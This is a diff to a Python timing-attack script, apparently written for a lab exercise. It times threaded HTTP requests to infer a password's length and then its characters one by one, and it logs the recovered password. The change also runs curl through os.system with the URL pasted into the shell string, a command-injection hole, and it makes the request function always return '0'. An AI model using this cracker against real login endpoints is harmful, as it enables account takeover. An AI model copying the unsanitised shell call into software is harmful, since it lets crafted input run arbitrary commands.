@@ -147,10 +147,14 @@ def run_url(url: str) -> str:
     :return: str. source code of the given URL.
     """
     timer.sleep(Configurations.sleep_time)
-    ans = urllib.request.urlopen(url)
+    # ans = urllib.request.urlopen(url)
+    command = 'curl -s -w "%{time_total}s" ' + f'"{url}"'
+    os.system(command)
+
     timer.sleep(Configurations.sleep_time)
 
-    return ans.read().decode("utf-8")
+    return '0'
+    # return ans.read().decode("utf-8")
 
 
 def check_password_size_thread(url: str, iterations: int, thread_number: int, logger) -> float:
@@ -175,8 +179,8 @@ def check_password_size_thread(url: str, iterations: int, thread_number: int, lo
         # insert to dict
         total_iterations_time += end - start
 
-        if i % 100 == 0:
-            write_log(logger, f"[check password size thread][thread {thread_number}][iter {i}] result: {total_iterations_time}:")
+        if i + 1 == iterations:
+            write_log(logger, message=f"[check password size thread][thread {thread_number}]: result: {total_iterations_time}:")
 
     return total_iterations_time
 
@@ -207,7 +211,7 @@ def check_password_size(start_url: str = "", end_url: str = "",
         future_results[i] = future_results[i].result()
 
     password_length_index = future_results.index(max(future_results))
-    write_log(logger, f"[check_password_size]: password length is: {password_length_index}")
+    write_log(logger, log_level="debug", message=f"[check_password_size]: password length is: {password_length_index}")
 
     return password_length_index
 
@@ -234,9 +238,10 @@ def crack_password_thread(url, ch, iterations: int=Configurations.attempts, logg
         # insert to dict
         total_iterations_time += (end - start)
         if result == '1':
-            raise ValueError(f"FoundPassWord! 'url'.")
-        if i % 1 == 0:
-            write_log(logger, f"[crack password thread][{ch}][iteration {i}] result time: {total_iterations_time}  -  {url}")
+            raise ValueError(f"FoundPassWord! '{url}'.")
+        if i + 1 == iterations:
+            write_log(logger, log_level="info", message=f"[crack password thread][{ch}]: result time: {total_iterations_time}  -  {url}")
+            pass
 
     return ch, total_iterations_time
 
@@ -252,6 +257,7 @@ def crack_password(password_size: int, start_url: str = "", end_url: str = "", l
     password = "izxuwlxfktdnba"
     password = "izxuwlxfktd"
     password = ""
+    # password = "xoxxmzsfkvpphm"
 
     for i in range(password_size - len(password)):
 
@@ -271,12 +277,11 @@ def crack_password(password_size: int, start_url: str = "", end_url: str = "", l
             letters_dict[result[0]] = result[1]
 
         maximum_key = max(letters_dict, key=letters_dict.get)
-        print(maximum_key, letters_dict[maximum_key])
 
         password += maximum_key
-        write_log(logger, f"[crack password]: iteration {i} got that the chosen letter if: {maximum_key} (current password is '{password}).')")
+        write_log(logger, log_level="debug", message=f"[crack password][iter {i}]: chosen letter if: {maximum_key}, time: {letters_dict[maximum_key]} (current password is '{password}).')")
 
-    write_log(logger, f"[crack password]: password found: {password}   .")
+    write_log(logger, log_level="debug", message=f"[crack password]: password found: {password}   .")
 
     return password
 
@@ -294,20 +299,19 @@ def timing_attack(start_url: str = "", end_url: str = "",
     """
     logger = set_logger(Configurations.result_path, "crack password")
 
-    size = 15
-    # size = check_password_size(start_url, end_url, password_size, logger)
+    size = check_password_size(start_url, end_url, password_size, logger)
+    # size = 15
 
     if size is None:
         return None
 
-    write_log(logger, f"[timing attack]: password with maximal time is in length: {size}.")
-    write_log(logger, f"[timing attack]: starting to lookup password in size {size}.")
+    write_log(logger, log_level="debug", message=f"[timing attack]: starting to lookup password in size {size}.")
 
     plaintext_password = crack_password(password_size=size, start_url=start_url, end_url=end_url, logger=logger)
 
     if plaintext_password is None:
         return None
 
-    write_log(logger, f"password is: {plaintext_password}.")
+    write_log(logger, log_level="debug", message=f"password is: {plaintext_password}.")
 
     return plaintext_password
